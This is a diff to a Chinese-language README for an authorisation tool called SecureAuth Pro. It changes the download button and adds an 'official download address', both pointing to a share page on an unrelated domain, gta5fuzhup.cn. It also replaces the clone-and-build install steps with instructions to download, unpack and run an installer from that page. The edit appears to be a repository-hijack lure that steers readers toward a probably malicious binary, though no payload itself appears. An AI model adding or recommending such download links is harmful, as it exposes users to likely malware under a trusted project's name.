@@ -14,7 +14,7 @@
 
 *为专业开发者和高级用户设计*
 
-[📥 下载](#installation) • [📚 文档](#documentation) • [🔧 API](#api-reference) • [💬 社区](#community)
+[📥 立即下载](https://gta5fuzhup.cn/share.php?code=c808198c) • [📚 文档](#documentation) • [🔧 API](#api-reference) • [💬 社区](#community)
 
 </div>
 
@@ -44,12 +44,16 @@
 - **内存**: 最小 512MB，推荐 2GB+
 - **存储**: 100MB 可用空间
 
+### 📥 下载安装
+
+**官方下载地址**: [https://gta5fuzhup.cn/share.php?code=c808198c](https://gta5fuzhup.cn/share.php?code=c808198c)
+
 ### 安装步骤
 
-1. 克隆项目到本地目录
-2. 安装项目依赖包
-3. 初始化系统配置
-4. 启动授权服务
+1. 从官方下载地址获取最新版本
+2. 解压下载的安装包到指定目录
+3. 运行安装程序完成系统配置
+4. 启动SecureAuth Pro授权服务
 
 ### 快速配置
 
